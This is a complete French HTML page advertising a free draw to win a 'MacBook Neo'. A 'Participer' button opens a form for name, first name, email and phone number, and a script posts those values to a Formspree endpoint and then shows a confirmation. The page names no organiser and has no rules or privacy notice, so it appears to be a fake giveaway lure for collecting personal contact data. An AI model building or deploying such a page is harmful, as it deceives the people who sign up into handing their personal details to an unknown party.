<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Gagnez un MacBook Neo</title>

<style>
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, sans-serif;
  background: #000;
  color: white;
}

.container {
  text-align: center;
  padding: 40px 20px;
}

.hero img {
  width: 100%;
  max-width: 500px;
  border-radius: 20px;
}

h1 {
  font-size: 40px;
  margin: 20px 0 10px;
}

p {
  color: #aaa;
}

.btn {
  background: white;
  color: black;
  padding: 14px 25px;
  border-radius: 25px;
  border: none;
  font-weight: bold;
  margin-top: 20px;
  cursor: pointer;
}

.form-container {
  display: none;
  margin-top: 30px;
}

input {
  width: 100%;
  padding: 12px;
  margin: 10px 0;
  border-radius: 10px;
  border: none;
}

.success {
  display: none;
  margin-top: 40px;
}

.card {
  max-width: 400px;
  margin: auto;
}

</style>
</head>

<body>

<div class="container">

  <!-- PAGE 1 -->
  <div id="step1" class="card">
    <div class="hero">
      <img src="https://images.unsplash.com/photo-1517336714731-489689fd1ca8" alt="MacBook">
    </div>

    <h1>Gagnez le nouveau MacBook</h1>
    <p>Participez gratuitement pour tenter de remporter ce modèle dernière génération.</p>

    <button class="btn" onclick="showForm()">Participer</button>
  </div>

  <!-- FORM -->
  <div id="step2" class="form-container card">
    <h2>Inscription</h2>

    <form id="contestForm">
      <input type="text" id="nom" placeholder="Nom" required>
      <input type="text" id="prenom" placeholder="Prénom" required>
      <input type="text" id="email" placeholder="Email" required>
      <input type="text" id="telephone" placeholder="Téléphone" required>

      <button class="btn" type="submit">Valider</button>
    </form>
  </div>

  <!-- SUCCESS -->
  <div id="step3" class="success card">
    <h2>🎉 Bravo !</h2>
    <p>Votre participation a bien été enregistrée.</p>
    <p>Les résultats vous seront communiqués prochainement.</p>
  </div>

</div>

<script>
function showForm() {
  document.getElementById("step1").style.display = "none";
  document.getElementById("step2").style.display = "block";
}

document.getElementById("contestForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const nom = document.getElementById("nom").value;
  const prenom = document.getElementById("prenom").value;
  const email = document.getElementById("email").value.toLowerCase();
  const telephone = document.getElementById("telephone").value;

  fetch("https://formspree.io/f/xnjozjby", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      nom,
      prenom,
      email,
      telephone
    })
  });

  document.getElementById("step2").style.display = "none";
  document.getElementById("step3").style.display = "block";
});
</script>

</body>
</html>
